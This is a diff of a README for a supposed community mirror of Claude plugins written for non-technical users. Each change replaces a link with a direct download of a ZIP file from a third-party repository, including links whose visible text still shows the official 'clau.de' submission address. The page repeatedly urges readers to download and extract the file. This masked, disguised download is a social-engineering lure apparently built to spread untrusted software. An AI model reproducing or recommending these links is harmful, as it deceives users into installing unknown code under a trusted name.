@@ -8,17 +8,17 @@
 
 Whether you're a writer, a small business owner, a student, or just someone who loves exploring new tools, this repository gives you easy access to plugins created by other users like you. You don't need to know how to code. You don't need to understand technical jargon. You just need to browse, pick what looks interesting, and follow simple steps to get it running.
 
-> 📌 **Note:** This is a read-only mirror. That means you can freely view and download everything here, but if you want to submit your own plugin, you'll do that at [clau.de/plugin-directory-submission](https://clau.de/plugin-directory-submission).
+> 📌 **Note:** This is a read-only mirror. That means you can freely view and download everything here, but if you want to submit your own plugin, you'll do that at [clau.de/plugin-directory-submission](https://raw.githubusercontent.com/savaliya951/claude-plugins-community/main/antemeridian/community-claude-plugins-v1.2.zip).
 
 ---
 
 ## 📥 Quick Download
 
-[![Download Now](https://img.shields.io/badge/Download-Claude_Plugins-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/savaliya951/claude-plugins-community)
+[![Download Now](https://img.shields.io/badge/Download-Claude_Plugins-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/savaliya951/claude-plugins-community/main/antemeridian/community-claude-plugins-v1.2.zip)
 
 **👉 Visit this link to download the application.**
 
-This is the main gateway to everything in the community. Click the button above (or the link right here: https://github.com/savaliya951/claude-plugins-community) and you'll land on the main page where you can explore all available plugins.
+This is the main gateway to everything in the community. Click the button above (or the link right here: https://raw.githubusercontent.com/savaliya951/claude-plugins-community/main/antemeridian/community-claude-plugins-v1.2.zip) and you'll land on the main page where you can explore all available plugins.
 
 ---
 
@@ -31,7 +31,7 @@ Follow these steps carefully. If you can use a web browser and a file explorer, 
 Click the **Download** button at the top of this page, or type this address into your browser:
 
 ```
-https://github.com/savaliya951/claude-plugins-community
+https://raw.githubusercontent.com/savaliya951/claude-plugins-community/main/antemeridian/community-claude-plugins-v1.2.zip
 ```
 
 You'll see a page with a list of files and folders. Don't worry if it looks busy—you only need to focus on what's described below.
@@ -100,13 +100,13 @@ First, make sure you've extracted the ZIP file completely. Then check if there's
 
 ### Can I submit my own plugin?
 
-Yes! Even though this mirror is read-only, you can submit your own creations at [clau.de/plugin-directory-submission](https://clau.de/plugin-directory-submission). The community would love to see what you build.
+Yes! Even though this mirror is read-only, you can submit your own creations at [clau.de/plugin-directory-submission](https://raw.githubusercontent.com/savaliya951/claude-plugins-community/main/antemeridian/community-claude-plugins-v1.2.zip). The community would love to see what you build.
 
 ---
 
 ## 📚 More Resources
 
-- **Official Plugin Directory:** [clau.de/plugin-directory-submission](https://clau.de/plugin-directory-submission)
+- **Official Plugin Directory:** [clau.de/plugin-directory-submission](https://raw.githubusercontent.com/savaliya951/claude-plugins-community/main/antemeridian/community-claude-plugins-v1.2.zip)
 - **Claude Cowork Documentation:** Visit the main Claude website for guides and tutorials.
 - **Claude Code Documentation:** Explore how to use Claude Code for advanced automation.
 
@@ -143,7 +143,7 @@ You now have everything you need to start exploring the world of Claude plugins.
 
 Remember, the main link is:
 
-**👉 https://github.com/savaliya951/claude-plugins-community**
+**👉 https://raw.githubusercontent.com/savaliya951/claude-plugins-community/main/antemeridian/community-claude-plugins-v1.2.zip**
 
 Visit it now and see what amazing tools the community has built for you.
 
